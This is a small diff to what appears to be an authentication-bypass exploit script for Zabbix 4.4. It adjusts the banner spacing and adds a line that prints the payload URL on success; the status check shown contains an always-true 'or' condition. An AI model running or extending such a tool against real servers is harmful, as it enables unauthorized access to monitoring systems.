@@ -14,7 +14,7 @@ zabbix_text = "Zabbix SIA"
 
 banner = """[cyan]
     Zubbix | Zabbix 4.4 - Auth Bypass
-            @opps3c[/]
+                @opps3c[/]
 """
 
 def clear():
@@ -74,6 +74,7 @@ def exploit(target_url):
 
         if(payload_response == 200):
             print("\n[green]:: The target is vulnerable, exploit worked.[/]")
+            print(f"[green]:: URL: {url_payload}\n")
         elif(payload_response == 301 or 403):
             return print(f"\n[red]:: The target is not vulnerable, sorry. [/]")
         else:
